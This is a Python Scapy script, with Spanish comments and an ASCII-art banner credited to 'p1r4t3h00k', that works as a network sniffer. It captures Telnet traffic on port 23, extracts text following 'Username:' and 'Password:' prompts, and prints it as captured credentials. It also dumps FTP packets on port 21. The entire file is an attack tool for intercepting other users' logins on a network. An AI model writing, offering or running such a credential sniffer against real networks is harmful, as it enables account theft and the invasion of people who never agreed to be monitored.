from scapy.all import *

# Función para manejar los paquetes Telnet
def telnet_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        if packet[TCP].dport == 23 or packet[TCP].sport == 23:
            print("[Telnet Packet Detected]")
            # Obtener los datos de carga útil (payload) del paquete
            payload = packet[Raw].load.decode('utf-8', 'ignore').strip()
            # Buscar cadenas de usuario y contraseña en los datos de carga útil
            user_index = payload.find("Username:")
            pass_index = payload.find("Password:")
            # Si se encuentra el usuario y la contraseña, mostrarlos
            if user_index != -1:
                username = payload[user_index + 9:].splitlines()[0]
                print("Username:", username)
            if pass_index != -1:
                password_lines = payload[pass_index + 9:].splitlines()
                if password_lines:
                    password = password_lines[0]
                    print("Password:", password)
            # Mostrar información detallada del paquete
            print(packet.show())

# Función para manejar los paquetes FTP
def ftp_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        if packet[TCP].dport == 21 or packet[TCP].sport == 21:
            print("[FTP Packet Detected]")
            print(packet.show())

# Mensaje personalizado con colores llamativos
def print_banner():
    print("\033[1;35m")  # Cambiar color a magenta brillante
    print("**********************************")
    print("*        FTP & Telnet Sniffer    *")
    print("*    Created by p1r4t3h00k       *")
    print("**********************************")
    print("\033[0m")  # Restaurar color predeterminado
    print()
    print("""
          \033[1;36m_;~)                  (~;_
        (   |                  |   )
         ~', ',    ,''~'',   ,' ,'~
             ', ','       ',' ,'
               ',: {'} {'} :,'
                 ;   /^\   ;
                  ~\  ~  /~
                ,' ,~~~~~, ',
              ,' ,' ;~~~; ', ',
            ,' ,'    '''    ', ',
          (~  ;               ;  ~)
           -;_)               (_;-\033[0m
    """)

# Menú de opciones
def menu():
    print_banner()
    print("Seleccione el tipo de tráfico que desea interceptar:")
    print("1. Telnet")
    print("2. FTP")
    option = input("Ingrese el número de opción: ")
    if option == "1":
        sniff(prn=telnet_packet, filter="tcp port 23", store=0)
    elif option == "2":
        sniff(prn=ftp_packet, filter="tcp port 21", store=0)
    else:
        print("Opción inválida. Por favor, ingrese 1 o 2.")

# Ejecutar el menú
if __name__ == "__main__":
    menu()
